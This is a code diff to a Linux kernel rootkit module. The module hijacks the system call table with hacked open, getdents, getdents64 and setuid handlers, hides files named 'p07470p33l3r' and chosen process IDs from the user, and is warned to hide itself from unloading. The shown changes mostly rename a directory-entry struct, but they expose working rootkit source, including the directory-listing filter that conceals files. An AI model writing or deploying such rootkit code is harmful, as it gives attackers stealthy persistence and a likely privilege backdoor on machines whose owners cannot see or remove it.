@@ -8,6 +8,9 @@
 #include <linux/dirent.h>
 #include <linux/fs.h>
 #include <linux/types.h> 
+#include <linux/fcntl.h>
+#include <linux/sched.h>
+#include <linux/fs_struct.h>
 
 /* WARNING! If you insmod this module without commenting out the module hiding lines,
 you won't be able to rmmod it. Brick your system and no one will feel bad for you */
@@ -44,20 +47,19 @@ psize *system_call_table; // Store syscall table location
 char *hide_file = "p07470p33l3r"; // Name of files/directories to hide from user
 char hidden_PIDs[50][5];
 int index = 0;
-int __NR_myexecve;
 
-struct linux_dirent {
-	long d_ino;     /* Inode number */
-	off_t d_off;     /* Offset to next linux_dirent */
-	unsigned short d_reclen;  /* Length of this linux_dirent */
-	char d_name[];  /* Filename (null-terminated) */
+struct dirent {
+	unsigned long d_ino;
+	unsigned long d_off;
+	unsigned short d_reclen;
+	char d_name[];
 };
 
 /* Hacked Syscall Pointers */
 
 asmlinkage int (*orig_open)(const char *, int, mode_t);
 asmlinkage int (*orig_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int);
-asmlinkage int (*orig_getdents)(unsigned int, struct linux_dirent *, unsigned int);
+asmlinkage int (*orig_getdents)(unsigned int, struct dirent *, unsigned int);
 asmlinkage int (*orig_setuid)(uid_t);
 
 /* Function Declarations */
@@ -145,15 +147,15 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, u
 	return tmp;
 }
 
-asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){ // Hacked version of the getdents64 syscall
+asmlinkage int hacked_getdents(unsigned int fd, struct dirent *dirp, unsigned int count){ // Hacked version of the getdents64 syscall
         unsigned int tmp, n;
         int t;
-        struct linux_dirent *dirp2, *dirp3;
+        struct dirent *dirp2, *dirp3;
 
         tmp = (*orig_getdents)(fd, dirp, count); // Basiclly it runs the original, saves it, and does stuff. Idk how this shit works, I stole it
 
         if(tmp > 0){
-                dirp2 = (struct linux_dirent *) kmalloc(tmp, GFP_KERNEL);
+                dirp2 = (struct dirent *) kmalloc(tmp, GFP_KERNEL);
                 copy_from_user(dirp2, dirp, tmp);
                 dirp3 = dirp2;
                 t = tmp;
@@ -171,7 +173,7 @@ asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsig
                         }
 
                         if (t != 0){
-                                dirp3 = (struct linux_dirent *) ((char *) dirp3 + dirp3->d_reclen);
+                                dirp3 = (struct dirent *) ((char *) dirp3 + dirp3->d_reclen);
                         }
                 }
                 copy_to_user(dirp, dirp2, tmp);
